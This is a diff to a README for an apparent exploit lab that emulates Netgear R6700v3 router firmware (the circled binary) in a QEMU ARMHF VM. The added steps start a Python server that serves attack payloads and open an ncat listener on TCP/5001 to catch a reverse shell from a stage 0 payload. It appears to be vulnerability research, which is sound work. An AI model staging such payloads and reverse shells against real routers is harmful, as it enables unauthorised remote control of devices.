@@ -31,10 +31,17 @@
   # Copy circled.sh script
   cp firmware/circled.sh $ROOTFS/circled.sh
   ```
-- Copy the root filesystem to an ARMHF guest system (e.g. a *QEMU* ARMHF Debian VM)
+- Copy the directories `$ROOTFS/` and `server/` to an ARMHF guest system ((e.g. a *QEMU* ARMHF Debian VM))
 ### 1.2 Guest: ARMHF
-- In the following, we assume that variable $ROOTFS points to the copied firmware root filesystem
-
+- In the following, we assume that the variable $ROOTFS points to the copied firmware's root filesystem
+- Sart the HTTP server delivering our payloads:
+  ```
+  python3 server/circled.server.py
+  ```
+- In case you use the HTTP server with the default stage 0 payload, listen for the reverse shell on TCP/5001:
+  ```
+  ncat -l -p 5001
+  ```
 ## 1. Individual Binary Emulation
 - Extract the R6700v3 firmware with *binwalk*:
   ```
